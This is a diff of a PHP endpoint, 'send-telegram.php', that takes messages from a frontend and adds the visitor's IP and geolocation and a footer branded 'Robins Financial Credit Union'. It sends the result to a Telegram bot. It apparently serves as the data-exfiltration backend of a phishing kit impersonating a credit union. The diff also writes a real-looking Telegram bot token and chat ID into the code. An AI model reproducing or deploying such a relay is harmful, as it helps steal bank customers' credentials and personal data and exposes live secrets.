@@ -1,7 +1,7 @@
 <?php
 // api/send-telegram.php
 
-// Allow ANY domain to access this API
+// Allow requests from ANY domain (CORS)
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST, OPTIONS');
 header('Access-Control-Allow-Headers: Content-Type');
@@ -13,20 +13,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     exit;
 }
 
-const BOT_TOKEN = "bot";
-const CHAT_ID = "chat_id";
+// Your bot credentials
+const BOT_TOKEN = "8690222414:AAE98JaorMmqP8nlS0zSWlw3o_ocoRgPHGY";
+const CHAT_ID = "5207440324";
 
-// Get POST data
+// Get POST data from frontend
 $input = json_decode(file_get_contents('php://input'), true);
 $message = $input['message'] ?? '';
 $page = $input['page'] ?? 'unknown';
 
+// Validate message
 if (empty($message)) {
     echo json_encode(['success' => false, 'error' => 'No message provided']);
     exit;
 }
 
-// Get geo data
+// Get visitor's geo location
 $geo = null;
 $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? null;
 
@@ -54,7 +56,7 @@ if ($ip) {
     }
 }
 
-// Build footer
+// Build message footer
 $footerLines = [
     "",
     "🏦 <b>Robins Financial Credit Union</b>",
